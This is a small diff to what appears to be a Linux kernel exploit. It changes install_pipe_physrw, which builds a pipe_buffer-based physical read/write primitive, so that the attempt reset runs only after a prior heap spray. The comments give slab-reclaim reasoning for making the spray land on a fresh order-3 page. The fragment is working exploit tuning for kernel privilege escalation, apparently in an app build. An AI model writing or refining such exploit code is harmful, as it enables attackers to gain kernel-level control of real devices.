@@ -689,9 +689,15 @@ int install_pipe_physrw(int fd) {
    * pointers where a live slab page would hold its slab_cache. PIPE_MAX_ATTEMPTS
    * is 1 in the app build, so there is no retry to recover on.
    *
-   * reset_pipe_attempt() first because prepare_pipe_buffer_page() rebuilds the
-   * drain and reclaim fd arrays and kills the previous keeper child. */
-  reset_pipe_attempt();
+   * reset_pipe_attempt() only when something has already sprayed -- it rebuilds
+   * nothing, it frees, and freeing several hundred pipe_buffer slabs right
+   * before the reclaim lands the new page on a partially free slab instead of a
+   * fresh order-3 one. main.c skips its seeding spray for this target so that
+   * the usual path arrives here with nothing to reset, exactly as the non-app
+   * build does. */
+  if (pipebuf_page_base != 0) {
+    reset_pipe_attempt();
+  }
   pipebuf_page_base = prepare_pipe_buffer_page();
   pr_info("physrw pipe page refreshed=%016zx\n", pipebuf_page_base);
   if (!is_direct_ptr(pipebuf_page_base)) {
